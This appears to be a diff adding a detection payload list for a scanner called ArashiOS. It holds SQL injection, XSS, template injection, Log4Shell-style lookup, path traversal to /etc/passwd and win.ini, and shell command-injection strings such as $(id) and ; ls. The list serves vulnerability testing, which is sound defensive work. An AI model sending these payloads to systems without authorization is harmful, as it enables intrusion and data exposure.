@@ -1,0 +1,34 @@
+# ArashiOS detection payloads
+# String uji non-destruktif untuk mendeteksi kelas kerentanan, bukan untuk merusak sistem.
+'
+"
+' OR '1'='1
+" OR "1"="1
+' OR 1=1--
+admin'--
+1' ORDER BY 1--
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+{{7*7}}
+${7*7}
+#{7*7}
+%{7*7}
+..%2f..%2f..%2fetc%2fpasswd
+../etc/passwd
+..\..\..\windows\win.ini
+${jndi:ldap://127.0.0.1/test}
+%24%7bjndi%3aldap%3a%2f%2f127.0.0.1%2ftest%7d
+; ls
+| ls
+&& id
+$(id)
+`id`
+__import__('os').system('id')
+{{config}}
+{{self}}
+<%= 7*7 %>
+%!s(MESSAGE)
+${{7*7}}
+#{7*7}
+
